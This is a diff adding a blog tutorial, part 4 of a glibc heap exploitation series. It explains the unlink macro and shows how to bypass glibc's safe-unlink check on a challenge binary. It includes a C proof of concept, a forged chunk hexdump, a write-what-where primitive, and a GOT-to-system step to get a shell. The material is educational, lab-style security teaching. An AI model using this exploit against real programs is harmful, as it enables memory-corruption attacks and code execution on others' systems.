@@ -1,0 +1,208 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>unsafe unlink (and the safe-unlink bypass) — algoatson.github.io</title>
+<meta name="description" content="Part 4 — when a free chunk is pulled out of a doubly-linked list, four pointer writes happen. Forge the pointers and one of them lands wherever you want. Then the modern twist: how to pass the &quot;corrupted double-linked list&quot; check that was supposed to kill this.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/unsafe-unlink/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unsafe unlink (and the safe-unlink bypass) — algoatson.github.io">
+<meta property="og:description" content="Part 4 — when a free chunk is pulled out of a doubly-linked list, four pointer writes happen. Forge the pointers and one of them lands wherever you want. Then the modern twist: how to pass the &quot;corrupted double-linked list&quot; check that was supposed to kill this.">
+<meta property="og:url" content="https://algoatson.github.io/p/unsafe-unlink/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/unsafe-unlink.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "unsafe unlink (and the safe-unlink bypass)", "datePublished": "2026-06-12", "dateModified": "2026-06-12", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "Part 4 — when a free chunk is pulled out of a doubly-linked list, four pointer writes happen. Forge the pointers and one of them lands wherever you want. Then the modern twist: how to pass the \"corrupted double-linked list\" check that was supposed to kill this.", "url": "https://algoatson.github.io/p/unsafe-unlink/", "mainEntityOfPage": "https://algoatson.github.io/p/unsafe-unlink/", "keywords": "heap, pwn, glibc"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>unsafe unlink (and the safe-unlink bypass)</h1>
+  <div class="meta"><span>2026-06-12</span><span>5 min read</span><a class="tag" href="/tags/heap/">heap</a> <a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/glibc/">glibc</a></div>
+</header>
+<aside class="series" aria-label="series navigation"><div class="series__head"><span class="series__label">series</span><span class="series__name">glibc heap exploitation</span><span class="series__pos">part 4 of 6</span></div><ol class="series__list"><li><a href="/p/glibc-heap-internals/">the glibc heap, from the chunk up</a></li><li><a href="/p/house-of-force/">the House of Force</a></li><li><a href="/p/fastbin-dup/">fastbin dup</a></li><li class="cur" aria-current="true">unsafe unlink (and the safe-unlink bypass)</li><li><a href="/p/the-unsorted-bin-attack/">the unsorted bin attack</a></li><li><a href="/p/tcache-poisoning-explained/">tcache poisoning, explained like you&#x27;ll have to use it</a></li></ol></aside>
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-four-operations">the four operations</a></li>
+<li><a href="#the-check-that-killed-it">the check that killed it</a></li>
+<li><a href="#the-bypass-point-the-writes-at-a-pointer-to-yourself">the bypass: point the writes at a pointer to yourself</a></li>
+<li><a href="#trigger-it-with-a-backward-consolidation">trigger it with a backward consolidation</a></li>
+<li><a href="#what-you-get">what you get</a></li>
+<li><a href="#modern-status">modern status</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>The doubly-linked bins (unsorted, small, large) splice chunks out with the
+<code class="highlight">unlink</code> macro. It's four pointer operations, and two of them are <em>writes</em> through
+attacker-reachable fields. Forge a chunk's <code class="highlight">fd</code>/<code class="highlight">bk</code>, get it unlinked, and you
+turn a heap overflow into a write — no hook, no leak of a code pointer, just the
+list eating itself.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./unlink</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>libc</dt><dd>2.27</dd></div><div><dt>technique</dt><dd>backward consolidation -&gt; unlink() -&gt; overwrite a known global</dd></div><div><dt>requires</dt><dd>a global/known pointer that holds the chunk&#x27;s own address</dd></div></dl></div></figure>
+<h2 id="the-four-operations">the four operations<a class="headerlink" href="#the-four-operations" title="Permanent link">#</a></h2>
+<p>This is <code class="highlight">unlink</code>, stripped to the moves that matter:</p>
+<figure class="codeblock"><figcaption><span class="fname">glibc malloc.c — unlink, abridged</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#glibc-mallocc-unlink-abridged-1">1</a></span>
+<span class="normal"><a href="#glibc-mallocc-unlink-abridged-2">2</a></span>
+<span class="normal"><a href="#glibc-mallocc-unlink-abridged-3">3</a></span>
+<span class="normal"><a href="#glibc-mallocc-unlink-abridged-4">4</a></span>
+<span class="normal"><a href="#glibc-mallocc-unlink-abridged-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="glibc-mallocc-unlink-abridged-1"><span class="n">FD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span><span class="w">                       </span><span class="c1">// P&#39;s forward pointer  (P+0x10)</span>
+</span><span id="glibc-mallocc-unlink-abridged-2"><span class="n">BK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span><span class="w">                       </span><span class="c1">// P&#39;s backward pointer (P+0x18)</span>
+</span><span id="glibc-mallocc-unlink-abridged-3"><span class="c1">// ... the safe-unlink check goes here (see below) ...</span>
+</span><span id="glibc-mallocc-unlink-abridged-4"><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BK</span><span class="p">;</span><span class="w">                      </span><span class="c1">// *(FD + 0x18) = BK</span>
+</span><span id="glibc-mallocc-unlink-abridged-5"><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FD</span><span class="p">;</span><span class="w">                      </span><span class="c1">// *(BK + 0x10) = FD</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Control <code class="highlight">P-&gt;fd</code> and <code class="highlight">P-&gt;bk</code> and those last two lines are two arbitrary-ish writes:
+<code class="highlight">*(fd + 0x18) = bk</code> and <code class="highlight">*(bk + 0x10) = fd</code>. The original (pre-2004) attack just
+pointed <code class="highlight">fd</code>/<code class="highlight">bk</code> at a GOT entry and overwrote it. Easy — and long dead.</p>
+<h2 id="the-check-that-killed-it">the check that killed it<a class="headerlink" href="#the-check-that-killed-it" title="Permanent link">#</a></h2>
+<p>glibc has guarded <code class="highlight">unlink</code> for two decades with:</p>
+<figure class="codeblock"><figcaption><span class="fname">the safe-unlink check</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#the-safe-unlink-check-1">1</a></span>
+<span class="normal"><a href="#the-safe-unlink-check-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="the-safe-unlink-check-1"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__builtin_expect</span><span class="w"> </span><span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">P</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">P</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span>
+</span><span id="the-safe-unlink-check-2"><span class="w">    </span><span class="n">malloc_printerr</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;corrupted double-linked list&quot;</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>To unlink <code class="highlight">P</code>, its forward neighbour must point back at it (<code class="highlight">FD-&gt;bk == P</code>) and its
+backward neighbour must point forward at it (<code class="highlight">BK-&gt;fd == P</code>). You can't just aim
+<code class="highlight">fd</code>/<code class="highlight">bk</code> at the GOT anymore — those addresses don't point back at <code class="highlight">P</code>.</p>
+<h2 id="the-bypass-point-the-writes-at-a-pointer-to-yourself">the bypass: point the writes at a pointer to yourself<a class="headerlink" href="#the-bypass-point-the-writes-at-a-pointer-to-yourself" title="Permanent link">#</a></h2>
+<p>The escape hatch is when the program keeps a <strong>global pointer</strong> holding the chunk's
+own address — which most note/heap challenges do. Call it <code class="highlight">ptr</code>. Build a fake chunk
+header <em>inside</em> the chunk <code class="highlight">ptr</code> refers to, and set:</p>
+<div class="math math-block"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow><mtext>fd</mtext><mo>&#x0003D;</mo><mi>&#x00026;</mi><mtext>ptr</mtext><mo>&#x02212;</mo><mn>0</mn><mi>x</mi><mn>18</mn><mo>&#x0002C;</mo><mspace width="2em" /><mtext>bk</mtext><mo>&#x0003D;</mo><mi>&#x00026;</mi><mtext>ptr</mtext><mo>&#x02212;</mo><mn>0</mn><mi>x</mi><mn>10</mn></mrow></math></div>
+<p>Now walk the check. <code class="highlight">FD-&gt;bk</code> reads <code class="highlight">*(\&amp;ptr - 0x18 + 0x18) = *(\&amp;ptr) = ptr</code>, and
+<code class="highlight">BK-&gt;fd</code> reads <code class="highlight">*(\&amp;ptr - 0x10 + 0x10) = *(\&amp;ptr) = ptr</code>. Since <code class="highlight">ptr</code> holds the
+fake chunk's address, <strong>both equal <code class="highlight">P</code></strong> — the check passes. The fake header in a
+<code class="highlight">0x90</code> chunk:</p>
+<figure class="codeblock hexdump"><figcaption><span class="fname">fake chunk header, built over ptr&#x27;s own data</span><span class="lang">hex</span><button class="copy" type="button" aria-label="copy hexdump">copy</button></figcaption><div class="hx"><pre><span class="off">00000000</span>  00 00 00 00 00 00 00 00  91 00 00 00 00 00 00 00  <span class="asc">|................|</span>
+<span class="off">00000010</span>  <mark>e8</mark> <mark>5f</mark> <mark>60</mark> <mark>55</mark> <mark>55</mark> <mark>55</mark> <mark>00</mark> <mark>00</mark>  <mark>f0</mark> <mark>5f</mark> <mark>60</mark> <mark>55</mark> <mark>55</mark> <mark>55</mark> <mark>00</mark> <mark>00</mark>  <span class="asc">|<mark>.</mark><mark>_</mark><mark>`</mark><mark>U</mark><mark>U</mark><mark>U</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>_</mark><mark>`</mark><mark>U</mark><mark>U</mark><mark>U</mark><mark>.</mark><mark>.</mark>|</span></pre></div></figure>
+<p>(<code class="highlight">fd = &amp;ptr-0x18</code>, <code class="highlight">bk = &amp;ptr-0x10</code>, both pointing just below the global.)</p>
+<h2 id="trigger-it-with-a-backward-consolidation">trigger it with a backward consolidation<a class="headerlink" href="#trigger-it-with-a-backward-consolidation" title="Permanent link">#</a></h2>
+<p>You need <code class="highlight">unlink</code> to fire on the fake chunk. The cleanest trigger is freeing the
+<em>next</em> physical chunk after forging its <code class="highlight">prev_size</code> and clearing its <code class="highlight">PREV_INUSE</code>,
+so glibc thinks the previous chunk (your fake) is free and consolidates backward
+into it:</p>
+<figure class="codeblock codeblock--diff"><figcaption><span class="fname">prepping the next chunk so free() consolidates into the fake</span><span class="lang">diff</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#prepping-the-next-chunk-so-free-consolidates-into-the-fake-1">1</a></span>
+<span class="normal"><a href="#prepping-the-next-chunk-so-free-consolidates-into-the-fake-2">2</a></span>
+<span class="normal"><a href="#prepping-the-next-chunk-so-free-consolidates-into-the-fake-3">3</a></span>
+<span class="normal"><a href="#prepping-the-next-chunk-so-free-consolidates-into-the-fake-4">4</a></span>
+<span class="normal"><a href="#prepping-the-next-chunk-so-free-consolidates-into-the-fake-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="prepping-the-next-chunk-so-free-consolidates-into-the-fake-1"><span class="w"> </span>// chunk1 sits right after the fake chunk
+</span><span id="prepping-the-next-chunk-so-free-consolidates-into-the-fake-2"><span class="gd">-chunk1.prev_size = &lt;real&gt;</span>
+</span><span id="prepping-the-next-chunk-so-free-consolidates-into-the-fake-3"><span class="gd">-chunk1.size      = 0x91          // PREV_INUSE set: &quot;prev chunk in use&quot;</span>
+</span><span id="prepping-the-next-chunk-so-free-consolidates-into-the-fake-4"><span class="gi">+chunk1.prev_size = 0x90          // = the fake chunk&#39;s size, to reach its header</span>
+</span><span id="prepping-the-next-chunk-so-free-consolidates-into-the-fake-5"><span class="gi">+chunk1.size      = 0x90          // PREV_INUSE cleared: &quot;prev chunk is FREE&quot;</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<figure class="codeblock"><figcaption><span class="fname">unlink.c — the whole setup</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#unlinkc-the-whole-setup-1"> 1</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-2"> 2</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-3"> 3</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-4"> 4</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-5"> 5</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-6"> 6</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-7"> 7</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-8"> 8</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-9"> 9</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-10">10</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-11">11</a></span>
+<span class="normal"><a href="#unlinkc-the-whole-setup-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="unlinkc-the-whole-setup-1"><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">);</span><span class="w">              </span><span class="c1">// chunk0; `ptr` is the global the program keeps</span>
+</span><span id="unlinkc-the-whole-setup-2"><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">c1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">);</span><span class="w">         </span><span class="c1">// chunk1, physically after chunk0</span>
+</span><span id="unlinkc-the-whole-setup-3">
+</span><span id="unlinkc-the-whole-setup-4"><span class="n">ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x90</span><span class="p">;</span><span class="w">                   </span><span class="c1">// fake chunk size</span>
+</span><span id="unlinkc-the-whole-setup-5"><span class="n">ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x18</span><span class="p">;</span><span class="w">  </span><span class="c1">// fake fd</span>
+</span><span id="unlinkc-the-whole-setup-6"><span class="n">ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x10</span><span class="p">;</span><span class="w">  </span><span class="c1">// fake bk</span>
+</span><span id="unlinkc-the-whole-setup-7">
+</span><span id="unlinkc-the-whole-setup-8"><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">c1</span><span class="p">)[</span><span class="mi">-2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x90</span><span class="p">;</span><span class="w">      </span><span class="c1">// chunk1 prev_size -&gt; reach the fake header</span>
+</span><span id="unlinkc-the-whole-setup-9"><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">c1</span><span class="p">)[</span><span class="mi">-1</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="mi">1UL</span><span class="p">;</span><span class="w">     </span><span class="c1">// clear chunk1 PREV_INUSE</span>
+</span><span id="unlinkc-the-whole-setup-10">
+</span><span id="unlinkc-the-whole-setup-11"><span class="n">free</span><span class="p">(</span><span class="n">c1</span><span class="p">);</span><span class="w">                        </span><span class="c1">// backward consolidation -&gt; unlink(fake)</span>
+</span><span id="unlinkc-the-whole-setup-12"><span class="c1">// post-unlink:  ptr == &amp;ptr - 0x18</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<h2 id="what-you-get">what you get<a class="headerlink" href="#what-you-get" title="Permanent link">#</a></h2>
+<p>After the unlink, the two writes leave <code class="highlight">ptr = &amp;ptr - 0x18</code>. The global now points
+<em>just below itself</em>, so writing through it overwrites <strong>itself</strong> — the textbook
+"write-what-where bootstrap":</p>
+<figure class="codeblock"><figcaption><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span>
+<span class="normal"><a href="#code-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1"><span class="n">ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">target</span><span class="p">;</span><span class="w">                 </span><span class="c1">// ptr[3] lands on &amp;ptr -&gt; ptr = target</span>
+</span><span id="code-2"><span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">                  </span><span class="c1">// now ptr -&gt; target, so this writes `value` there</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>From here it's the usual end-game: point <code class="highlight">ptr</code> at a GOT entry, <code class="highlight">__free_hook</code>, or a
+saved return address and write your gadget.</p>
+<details class="spoiler">
+<summary>the win</summary>
+<p>Overwrite the GOT entry for <code class="highlight">free</code> (Partial RELRO) with <code class="highlight">system</code>, then free a
+chunk holding <code class="highlight">/bin/sh</code>:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-6-1">segfault{unl1nk_th3_l1nk3d_l1st}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<div class="admonition warning">
+<p class="admonition-title">the offsets are merciless</p>
+<p><code class="highlight">0x10</code> and <code class="highlight">0x18</code> here are <code class="highlight">offsetof(fd)</code> and <code class="highlight">offsetof(bk)</code>; the <code class="highlight">0x90</code>s must
+match your real chunk size; and <code class="highlight">&amp;ptr</code> is a <em>static/global</em> address (so a
+no-PIE binary, or you need a leak). One byte off and you get
+<code class="highlight">corrupted double-linked list</code> or a <code class="highlight">SIGSEGV</code>. Single-step <code class="highlight">free(c1)</code> in
+pwndbg and watch <code class="highlight">ptr</code> change — don't compute it blind.</p>
+</div>
+<h2 id="modern-status">modern status<a class="headerlink" href="#modern-status" title="Permanent link">#</a></h2>
+<p>The <code class="highlight">unlink</code> check is permanent, so the <strong>bypass</strong> (this post) is the real
+technique now — and it still works wherever a program hands you a known pointer to
+your own chunk and an overflow into the adjacent chunk's size. On tcache-heavy
+modern glibc you'll more often reach for <a href="/p/tcache-poisoning-explained/">tcache poisoning</a>,
+but unlink is the one to understand cold: it's the clearest demonstration that
+<strong>a free chunk is just a node, and the allocator trusts its links.</strong> Next, Part 5,
+those links write a <em>libc</em> pointer for you — the <a href="/p/the-unsorted-bin-attack/">unsorted bin attack</a>.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><a class="row" href="/p/the-unsorted-bin-attack/"><span class="row__date">2026-06-13</span><span class="row__tag">heap</span><span class="row__title">the unsorted bin attack</span><span class="row__min">4 min</span></a><a class="row" href="/p/fastbin-dup/"><span class="row__date">2026-06-11</span><span class="row__tag">heap</span><span class="row__title">fastbin dup</span><span class="row__min">4 min</span></a><a class="row" href="/p/house-of-force/"><span class="row__date">2026-06-09</span><span class="row__tag">heap</span><span class="row__title">the House of Force</span><span class="row__min">4 min</span></a></div></section>
+<nav class="pager"><a class="prev" href="/p/the-unsorted-bin-attack/"><span class="lbl">&#8249; newer</span>the unsorted bin attack</a><a class="next" href="/p/fastbin-dup/"><span class="lbl">older &#8250;</span>fastbin dup</a></nav></main>
+
+    <footer class="status">
+      <span>20 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h3>keys</h3><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/search-index.js"></script>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
